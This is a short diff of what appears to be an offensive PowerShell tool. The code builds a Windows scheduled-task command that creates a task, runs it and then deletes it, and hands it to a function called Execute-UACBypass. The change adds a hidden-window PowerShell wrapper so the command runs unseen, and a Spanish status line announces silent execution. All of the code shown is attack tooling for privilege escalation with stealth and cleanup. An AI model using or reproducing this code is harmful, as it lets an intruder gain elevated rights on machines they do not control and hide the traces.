@@ -241,7 +241,7 @@ exit /b 0
         $runTask = "schtasks /run /tn `"$taskName`" >nul 2>&1"
         $waitAndClean = "timeout /t 5 >nul && schtasks /delete /tn `"$taskName`" /f >nul 2>&1"
         
-        $fullCommand = "cmd.exe /c $createTask && $runTask && $waitAndClean"
+        $fullCommand = "powershell -WindowStyle Hidden `"cmd.exe /c $createTask && $runTask && $waitAndClean`""
         
         Write-Host "[+] Ejecutando tarea programada de forma silenciosa..." -ForegroundColor Yellow
         $result = Execute-UACBypass -CommandToExecute $fullCommand
